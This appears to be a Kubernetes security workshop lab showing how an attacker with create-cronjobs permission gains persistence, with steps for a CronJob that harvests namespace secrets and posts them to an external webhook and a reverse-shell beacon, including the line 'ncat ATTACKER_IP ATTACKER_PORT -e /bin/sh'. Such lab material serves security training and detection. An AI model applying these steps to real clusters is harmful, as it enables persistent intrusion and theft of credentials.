# Kubernetes CronJob

An attacker with `create cronjobs` permission can schedule malicious code to run periodically inside the cluster. The CronJob controller ensures the workload executes on schedule even if individual job pods are deleted, providing reliable persistence that is harder to spot than a continuously running container.

## Description

A Kubernetes `CronJob` creates `Job` objects on a schedule defined in standard cron syntax. Each `Job` spawns one or more pods, which run to completion and then terminate. Attackers use CronJobs to:

- **Periodically exfiltrate data** — harvest secrets, tokens, and config maps from the API on a schedule and beacon them to an external collection endpoint.
- **Maintain a reverse-shell beacon** — reconnect to a command-and-control server every few minutes without keeping a long-lived process running (evades tools that look for persistent connections).
- **Survive pod deletion** — deleting a running job pod only stops that execution; the CronJob controller will spawn a fresh pod at the next scheduled interval.
- **Stay under the radar** — job pods are short-lived, making them harder to notice in `kubectl get pods` compared to always-running Deployments or DaemonSets.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create cronjobs` in the target namespace.

## Quick Start

### Step 1 — Review the CronJob manifest

The file `exfil-cronjob.yaml` defines a CronJob that runs every 5 minutes. Each execution:

1. Installs `curl` in an alpine container.
2. Reads the auto-mounted Kubernetes service account token.
3. Calls the Kubernetes API to list all secrets in the current namespace.
4. Posts the collected data to an external webhook.

```bash
cat exfil-cronjob.yaml
```

### Step 2 — Deploy the CronJob

```bash
kubectl apply -f exfil-cronjob.yaml
```

Expected output:

```
cronjob.batch/data-exfil created
```

Confirm the CronJob is scheduled:

```bash
kubectl get cronjob data-exfil
```

Expected output (Kubernetes v1.25+ includes a `TIMEZONE` column):

```
NAME         SCHEDULE      TIMEZONE   SUSPEND   ACTIVE   LAST SCHEDULE   AGE
data-exfil   */5 * * * *   <none>     False     0        <none>          10s
```

### Step 3 — Trigger an immediate execution for testing

Rather than waiting 5 minutes for the schedule, create a Job manually from the CronJob spec:

```bash
kubectl create job --from=cronjob/data-exfil exfil-manual-test
```

Watch the job pod start and run to completion:

```bash
kubectl get pods -l app=data-exfil --watch
```

Expected output:

```
NAME                      READY   STATUS      RESTARTS   AGE
exfil-manual-test-k7p9q   0/1     Completed   0          25s
```

### Step 4 — Observe the exfiltrated data

Read the logs from the completed pod to see what was collected:

```bash
POD=$(kubectl get pods -l job-name=exfil-manual-test -o jsonpath='{.items[0].metadata.name}')
kubectl logs $POD
```

The output shows the service account token and the secrets payload that was sent to the external endpoint.

### Step 5 — Demonstrate persistence through pod deletion

Delete the manually-triggered job pod:

```bash
kubectl delete pod $POD
```

The CronJob will create a new pod at the next scheduled interval (every 5 minutes). The attacker's data collection continues uninterrupted.

Verify the CronJob is still active after the pod deletion:

```bash
kubectl get cronjob data-exfil
```

### Step 6 — Observe scheduled execution history

After waiting for the next scheduled interval (or triggering another manual job), inspect the job history:

```bash
kubectl get jobs -l app=data-exfil
```

The `successfulJobsHistoryLimit: 3` setting keeps the last three completed job records (and their pods) available for log inspection. Older records are automatically pruned.

```bash
kubectl get pods -l app=data-exfil --sort-by='.metadata.creationTimestamp'
```

### Step 7 — Reverse-shell beacon variant (conceptual)

A CronJob can also be used to establish periodic reverse-shell connections rather than exfiltrating data:

```bash
# Example beacon command that would go in the CronJob args:
# ncat ATTACKER_IP ATTACKER_PORT -e /bin/sh
#
# Each execution attempts a connection. If the attacker is listening
# at that moment they get a shell; if not, the pod exits cleanly
# and tries again at the next interval.
```

This pattern means the attacker does not need a persistent listener — they can connect opportunistically at scheduled times.

## Reverse Shell Beacon

This section converts the conceptual reverse-shell beacon from Step 7 into a hands-on demo using two manifests: a listener pod and a CronJob that connects back to it every minute.

### Step 8 — Deploy the listener pod

The listener runs `netcat` in a loop, accepting one connection at a time and printing whatever the remote shell sends:

```bash
kubectl apply -f listener-pod.yaml
kubectl wait --for=condition=Ready pod/beacon-listener --timeout=60s
```

Note the listener's cluster IP for reference:

```bash
kubectl get svc beacon-listener
```

### Step 9 — Deploy the beacon CronJob

The CronJob runs every minute. Each execution opens a reverse shell back to the listener service:

```bash
kubectl apply -f beacon-cronjob.yaml
```

Verify the CronJob is scheduled:

```bash
kubectl get cronjob reverse-beacon
```

### Step 10 — Observe the connections

Watch the listener pod's logs to see incoming reverse-shell connections. Each connection runs `id` and `hostname` then exits:

```bash
# Wait ~60 seconds for the first CronJob execution, then check logs
kubectl logs beacon-listener -f
```

Expected output (one block per CronJob execution):

```
Listening on 0.0.0.0:4444
Connection received
uid=0(root) gid=0(root)
reverse-beacon-<jobid>
```

You can also watch job pods being created and completing:

```bash
kubectl get pods -l app=reverse-beacon --watch
```

### Beacon Cleanup

```bash
kubectl delete -f beacon-cronjob.yaml
kubectl delete -f listener-pod.yaml
```

## Cleanup

```bash
kubectl delete -f exfil-cronjob.yaml
kubectl delete job exfil-manual-test --ignore-not-found
```

Verify cleanup:

```bash
kubectl get cronjob,job,pod -l app=data-exfil
```

## Resources

- [Kubernetes CronJob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
- [Kubernetes Jobs](https://kubernetes.io/docs/concepts/workloads/controllers/job/)
- [MITRE ATT&CK for Containers — Kubernetes CronJob](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Kubernetes%20CronJob/)
